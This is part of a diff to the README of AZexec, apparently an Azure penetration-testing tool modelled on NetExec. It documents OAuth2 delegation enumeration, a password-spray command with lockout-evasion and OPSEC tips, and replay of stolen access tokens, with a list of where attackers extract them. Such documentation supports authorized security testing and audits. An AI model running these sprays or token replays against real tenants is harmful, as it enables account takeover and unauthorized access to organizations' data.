+.\azx.ps1 delegation-enum -ExportPath delegation.html
+```
+
+**What is Kerberos Delegation vs OAuth2 Delegation?**
+
+In on-premises Active Directory, Kerberos delegation allows services to impersonate users. In Azure/cloud environments, OAuth2 consent grants serve a similar purpose - allowing applications to act on behalf of users.
+
+**NetExec --delegate vs AZexec delegation-enum:**
+
+| Aspect | On-Premises (NetExec --delegate) | Azure (AZexec delegation-enum) |
+|--------|----------------------------------|--------------------------------|
+| **Command** | `nxc smb <target> -u User -p Pass --delegate` | `.\azx.ps1 delegation-enum` |
+| **Protocol** | Kerberos (port 88) / LDAP (port 389) | Microsoft Graph API (HTTPS/443) |
+| **Mechanism** | RBCD, Constrained/Unconstrained Delegation | OAuth2 Consent Grants |
+| **User Attribute** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | `oauth2PermissionGrants.consentType` |
+| **Impersonation Scope** | Specific services/SPNs | Specific API scopes (Mail.Send, etc.) |
+| **Tenant-Wide** | Unconstrained Delegation | Admin Consent (`AllPrincipals`) |
+
+**Kerberos to OAuth2 Concept Mapping:**
+
+| Kerberos Delegation | OAuth2 Equivalent | Risk Level |
+|---------------------|-------------------|------------|
+| **RBCD** (Resource-Based Constrained Delegation) | Admin Consent (`AllPrincipals`) | HIGH - Tenant-wide impersonation |
+| **S4U2Self** (Service for User to Self) | Delegated permissions with user context | MEDIUM - Per-user impersonation |
+| **Constrained Delegation** | Specific scope grants (e.g., `Mail.Send`) | MEDIUM - Limited to specific APIs |
+| **Unconstrained Delegation** | `Directory.AccessAsUser.All` | CRITICAL - Full directory as any user |
+
+**What delegation-enum Detects:**
+
+| Permission | Risk Level | Description |
+|------------|------------|-------------|
+| `Directory.AccessAsUser.All` | CRITICAL | Full directory access as any user (unconstrained delegation equivalent) |
+| `RoleManagement.ReadWrite.Directory` | CRITICAL | Can assign any directory role including Global Admin |
+| `AppRoleAssignment.ReadWrite.All` | CRITICAL | Can grant any permission to any application |
+| `Application.ReadWrite.All` | CRITICAL | Can modify any application including adding credentials |
+| `Mail.Send` | HIGH | Send email as users (phishing, BEC) |
+| `Mail.ReadWrite` / `Mail.ReadWrite.All` | HIGH | Full mailbox access (data exfiltration) |
+| `Files.ReadWrite.All` | HIGH | Access all OneDrive/SharePoint files |
+| `Group.ReadWrite.All` | HIGH | Modify any group membership |
+
+**Key Risk Factor:** `consentType = "AllPrincipals"` = Admin consent = Acts on behalf of ALL users in tenant
+
+**Required Permissions:**
+
+```
+Application.Read.All  - Read service principals and consent grants
+Directory.Read.All    - Read directory data for permission resolution
+```
+
+**Example Output:**
+```
+[*] AZX - Azure OAuth2 Delegation Enumeration
+[*] Command: OAuth2 Permission Grant Analysis (Impersonation Paths)
+[*] Azure equivalent of NetExec's --delegate flag
+
+[*] ========================================
+[*] PHASE 3: Admin Consent Grants (Tenant-Wide Impersonation)
+[*] ========================================
+
+[!] Admin consent grants allow apps to act on behalf of ALL users in the tenant
+[!] This is the Azure equivalent of RBCD (Resource-Based Constrained Delegation)
+
+AZR         00000003-0000...    443    Mail-Integration-App               [!] AllPrincipals:Mail.Send,Mail.ReadWrite (CRITICAL)
+    [+] Mail.Send [HIGH]
+    [+] Mail.ReadWrite [HIGH]
+    [!] Can send/read email as ANY user in tenant
+    [+] Resource: Microsoft Graph
+    [+] Consent: Admin (tenant-wide impersonation)
+
+AZR         12345678-abcd...    443    Legacy-Portal                      [!] AllPrincipals:Directory.AccessAsUser.All (CRITICAL)
+    [+] Directory.AccessAsUser.All [CRITICAL]
+    [!] FULL DIRECTORY ACCESS as any user - Azure equivalent of unconstrained delegation
+    [+] Resource: Microsoft Graph
+    [+] Consent: Admin (tenant-wide impersonation)
+
+[*] ========================================
+[*] PHASE 4: User Consent Grants (Per-User Impersonation)
+[*] ========================================
+
+[*] User consent grants allow apps to act on behalf of specific users who consented
+
+AZR         87654321-dcba...    443    HR-App                             [*] Principal:User.Read (LOW)
+    [*] Per-user consent only (15 users)
+    [+] User.Read [LOW]
+
+[*] ========================================
+[*] DELEGATION SUMMARY
+[*] ========================================
+    [!] CRITICAL IMPERSONATION APPS: 2
+    [!] HIGH RISK IMPERSONATION APPS: 3
+    [*] MEDIUM RISK APPS: 8
+    [*] LOW RISK APPS: 22
+    [*] Total OAuth2 Grants: 34
+    [*] Admin Consent Grants: 5 (3 unique apps)
+    [*] User Consent Grants: 29
+```
+
+**Security Analysis Features:**
+
+| Check | Risk Level | Description |
+|-------|------------|-------------|
+| Directory.AccessAsUser.All | CRITICAL | Equivalent to unconstrained delegation |
+| Mail permissions with AllPrincipals | CRITICAL | Tenant-wide email impersonation |
+| RoleManagement.ReadWrite.Directory | CRITICAL | Can grant any role |
+| High-risk permissions with admin consent | HIGH | Elevated due to tenant-wide scope |
+| User consent grants | MEDIUM/LOW | Risk depends on number of consenting users |
+
+**Use Cases:**
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Security Audit** | Review OAuth2 consent posture | `.\azx.ps1 delegation-enum -ExportPath audit.html` |
+| **Penetration Testing** | Identify impersonation paths | `.\azx.ps1 delegation-enum` |
+| **Compliance Check** | Verify consent grant policies | `.\azx.ps1 delegation-enum -ExportPath consent.csv` |
+| **Privilege Escalation** | Find apps that can escalate privileges | Review CRITICAL findings |
+
+**Attack Context:**
+1. Enumerate OAuth2 consent grants to identify impersonation opportunities
+2. Focus on admin consent grants (`AllPrincipals`) - these can impersonate ANY user
+3. Identify apps with `Directory.AccessAsUser.All` (unconstrained delegation equivalent)
+4. Look for apps with `Mail.Send` + admin consent (tenant-wide email spoofing)
+5. If an app with dangerous consent is compromised, attacker can impersonate users
+
+**Troubleshooting**:
+- **"Failed to retrieve service principals"**: Ensure you have `Application.Read.All` or `Directory.Read.All` permission.
+- **"Failed to retrieve OAuth2 permission grants"**: Ensure you have `Directory.Read.All` permission.
+- **Guest users may have limited access**: Guest accounts often cannot view consent grants due to restricted permissions.
 
 ---
 
@@ -5735,7 +6232,7 @@ For full service principal discovery, you need:
 This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.
 
 ```
-Copyright (C) 2025 Logisek
+Copyright (C) 2025-2026 Logisek
 https://github.com/Logisek/AZexec
 
 This program is free software: you can redistribute it and/or modify
@@ -5950,6 +6447,285 @@ nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray
 # AZexec equivalent
 .\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
 .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
+```
+
+### Enhanced Password Spraying with NetExec-Style Options
+
+AZexec now includes a dedicated `spray` command with NetExec-style options for enhanced password spraying capabilities:
+
+#### New Parameters
+
+| Parameter | NetExec Equivalent | Description |
+|-----------|-------------------|-------------|
+| `-ContinueOnSuccess` | `--continue-on-success` | Don't stop after finding valid credentials |
+| `-NoBruteforce` | `--no-bruteforce` | Linear pairing (user1:pass1, user2:pass2) instead of matrix |
+| `-PasswordFile` | `-p @file.txt` | Load multiple passwords from file |
+| `-Delay` | N/A | Seconds between password rounds (lockout protection) |
+| `-LocalAuth` | `--local-auth` | Only spray managed (cloud-only) domains, skip federated |
+
+#### Usage Examples
+
+```powershell
+# Basic single password spray (same as guest command)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Multi-password spray with 30-minute delay between rounds (OPSEC-safe)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800
+
+# Continue spraying after finding valid credentials
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -ContinueOnSuccess
+
+# Linear pairing mode (user1 with pass1, user2 with pass2, etc.)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+
+# Cloud-only spray - skip federated domains (Azure equivalent of --local-auth)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -LocalAuth
+
+# Full attack with HTML report
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-report.html
+```
+
+#### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass'` |
+| `nxc smb <target> -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` |
+| `nxc smb <target> -u users.txt -p @pass.txt` | `.\azx.ps1 spray ... -PasswordFile pass.txt` |
+| `nxc smb <target> -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` |
+| `nxc smb <target> -u users.txt -p 'Pass' --local-auth` | `.\azx.ps1 spray ... -LocalAuth` |
+
+#### OPSEC Considerations
+
+The `spray` command displays OPSEC warnings before execution:
+
+```
+[!] ============================================
+[!] OPSEC WARNING - PASSWORD SPRAY ATTACK
+[!] ============================================
+
+[*] Attack Configuration:
+    Users to test:       50
+    Passwords to test:   3
+    Total attempts:      150
+    Attack mode:         Matrix (all combinations)
+    Delay between rounds: 1800 seconds
+    Continue on success: No
+
+[*] Azure AD Smart Lockout Information:
+    Default threshold:   ~10 failed attempts per user
+    Lockout duration:    60 seconds (increases with attempts)
+    Familiar locations:  May have higher threshold
+```
+
+**Recommended OPSEC Settings:**
+- Use `-Delay 1800` (30 minutes) or higher between password rounds
+- Spray only 1-2 passwords per day per user
+- Use `-NoBruteforce` when you have user:password pairs
+- Test against a small subset first to assess lockout policies
+
+#### Attack Modes
+
+**Matrix Mode (Default):**
+Tests all user/password combinations. With 50 users and 3 passwords = 150 attempts.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt
+```
+
+**Linear Pairing Mode (-NoBruteforce):**
+Tests user1 with pass1, user2 with pass2, etc. Useful when you have leaked credential pairs.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+```
+
+#### Output Formats
+
+The spray command supports multiple export formats:
+
+| Format | Command | Best For |
+|--------|---------|----------|
+| CSV | `-ExportPath results.csv` | Quick analysis, Excel |
+| JSON | `-ExportPath results.json` | Programmatic processing |
+| HTML | `-ExportPath report.html` | Reports, presentations |
+
+#### Local Authentication Mode (-LocalAuth)
+
+Use `-LocalAuth` to only spray managed (cloud-only) domains, skipping federated domains. This is the Azure equivalent of NetExec's `--local-auth` flag.
+
+```powershell
+# Cloud-only spray (skips federated domains)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -LocalAuth
+```
+
+**Why Use This?**
+
+Federated domains redirect ROPC authentication to on-premises identity providers (AD FS, Okta, Ping, etc.) which may:
+- Block ROPC entirely (AADSTS7000218)
+- Have different lockout policies
+- Log authentication attempts in the on-prem IdP
+- Require different attack vectors
+
+**Managed Domain with -LocalAuth:**
+```
+AZR         managed.com                        443    [*] Mode: Cloud-only auth (LocalAuth)
+AZR         managed.com                        443    [+] Tenant exists
+AZR         managed.com                        443    [*] NameSpaceType: Managed
+AZR         managed.com                        443    [*] Federation: Managed (Cloud-only)
+...
+AZR         managed.com                        443    user@managed.com                   [+] SUCCESS! (Cloud) Got access token
+```
+
+**Federated Domain with -LocalAuth:**
+```
+AZR         federated.com                      443    [!] SKIPPED - Federated domain (use without -LocalAuth to spray)
+[*] Domain uses federation: AD FS
+[*] Auth would redirect to: https://sts.company.com/adfs/ls/
+```
+
+**Technical Background:**
+
+Unlike SMB where `--local-auth` bypasses domain entirely, Azure has constraints:
+1. Cannot force cloud-only auth for federated domains - tenant policy controls this
+2. Federated domains redirect ROPC to federation provider
+3. Some federated setups block ROPC entirely
+
+The `-LocalAuth` flag checks the domain's `NameSpaceType` (Managed/Federated) and skips federated domains to avoid:
+- Wasted attempts against ROPC-blocked domains
+- Triggering alerts in on-premises IdPs
+- Unpredictable lockout behavior from external IdPs
+
+---
+
+## 🔐 Checking Credentials (Domain) - Azure's Pwn3d! Equivalent
+
+AZexec provides NetExec's "Checking Credentials (Domain)" functionality - testing credentials and showing privilege level (`Pwn3d!` equivalent) in a single operation.
+
+### NetExec Comparison
+
+**NetExec Commands:**
+```bash
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORD'     # Password auth
+nxc smb 192.168.1.0/24 -u UserName -H 'NTHASH'       # Hash auth (Pass-the-Hash)
+```
+
+**NetExec Output:**
+```
+SMB  192.168.1.100  445  DC01  [+] DOMAIN\admin:Password (Pwn3d!)
+SMB  192.168.1.101  445  SRV01 [+] DOMAIN\user:Password
+SMB  192.168.1.102  445  SRV02 [-] DOMAIN\user:Password
+```
+
+**AZexec Equivalent:**
+```powershell
+# Credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Pass123'
+
+# Token-based auth (Azure's Pass-the-Hash equivalent)
+.\azx.ps1 guest -AccessToken "eyJ0eXAi..."
+```
+
+**AZexec Output:**
+```
+AZR         contoso.com                        443    admin@contoso.com              [+] SUCCESS! Got access token (GlobalAdmin!)
+AZR         contoso.com                        443    secops@contoso.com             [+] SUCCESS! Got access token (SecurityAdmin!)
+AZR         contoso.com                        443    user@contoso.com               [+] SUCCESS! Got access token
+AZR         contoso.com                        443    helpdesk@contoso.com           [+] Valid credentials - MFA REQUIRED
+AZR         contoso.com                        443    locked@contoso.com             [!] ACCOUNT LOCKED
+```
+
+### Automatic Admin Detection
+
+After successful authentication, AZexec **automatically** queries the user's role memberships and displays privilege indicators (NetExec's `Pwn3d!` equivalent):
+
+| Azure Role | Display Indicator | Risk Level |
+|------------|-------------------|------------|
+| Global Administrator | `(GlobalAdmin!)` | CRITICAL |
+| Privileged Role Administrator | `(PrivRoleAdmin!)` | CRITICAL |
+| Privileged Authentication Administrator | `(PrivAuthAdmin!)` | CRITICAL |
+| Security Administrator | `(SecurityAdmin!)` | HIGH |
+| Application Administrator | `(AppAdmin!)` | HIGH |
+| Authentication Administrator | `(AuthAdmin!)` | HIGH |
+| Cloud Application Administrator | `(CloudAppAdmin!)` | HIGH |
+| Conditional Access Administrator | `(CAAdmin!)` | HIGH |
+| Intune Administrator | `(IntuneAdmin!)` | HIGH |
+| User Administrator | `(UserAdmin!)` | MEDIUM |
+| Helpdesk Administrator | `(HelpdeskAdmin!)` | MEDIUM |
+| Password Administrator | `(PasswordAdmin!)` | MEDIUM |
+| Exchange Administrator | `(ExchangeAdmin!)` | MEDIUM |
+| SharePoint Administrator | `(SharePointAdmin!)` | MEDIUM |
+| Teams Administrator | `(TeamsAdmin!)` | MEDIUM |
+| Groups Administrator | `(GroupsAdmin!)` | MEDIUM |
+
+### Token-Based Authentication (Pass-the-Hash Equivalent)
+
+Azure AD doesn't use NTLM hashes, but OAuth2 access tokens serve as the equivalent "credential material" that can be stolen and replayed.
+
+**Why Token Auth Instead of Hash Auth?**
+- Azure AD doesn't use NTLM hashes for authentication
+- OAuth2 access tokens are the equivalent "credential material"
+- Token replay = Azure's Pass-the-Hash
+
+**Token Sources (where attackers extract tokens):**
+- Browser local storage / session storage
+- Process memory (Chrome, Edge, desktop apps)
+- Azure CLI token cache (`~/.azure/accessTokens.json`)
+- Azure PowerShell token cache
+- ADAL/MSAL token caches
+- Keychain (macOS) / Credential Manager (Windows)
+
+**Usage:**
+```powershell
+# Test with stolen/extracted access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+
+# Output shows username from token and privilege level
+# AZR  <tenant-id>  443  admin@contoso.com  [+] SUCCESS! Token validated (GlobalAdmin!)
+```
+
+### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u user -p 'pass'` | `.\azx.ps1 guest -Domain target.com -Username user@target.com -Password 'pass'` |
+| Shows `(Pwn3d!)` for admins | Automatic - shows `(GlobalAdmin!)`, `(SecurityAdmin!)`, etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` |
+
+### Technical Implementation
+
+**Privilege Check Process:**
+1. After successful ROPC authentication, we get an access token
+2. Use the token to query `https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole`
+3. Compare role template IDs against known privileged roles
+4. Display the highest-risk privilege indicator
+
+**Required Graph API Scope:**
+- `RoleManagement.Read.Directory` or `Directory.Read.All`
+- If the token lacks these scopes, privilege check is silently skipped
+
+**Rate Limiting Considerations:**
+- Automatic admin check adds 1-2 Graph API calls per successful auth
+- Only runs on SUCCESSFUL authentications (not failures)
+- Acceptable overhead even for large spray operations
+
+### Usage Examples
+
+```powershell
+# Single credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Summer2024!'
+# Output: AZR contoso.com 443 admin@contoso.com [+] SUCCESS! Got access token (GlobalAdmin!)
+
+# Password spray - automatically detects admin on each valid credential
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Token-based auth - test a stolen access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+# Username extracted from token claims automatically
+
+# Export results with privilege data
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass' -ExportPath results.json
+# JSON includes: PrivilegeLevel, PrivilegeDisplay, PrivilegedRoles array
 ```
 
 ---
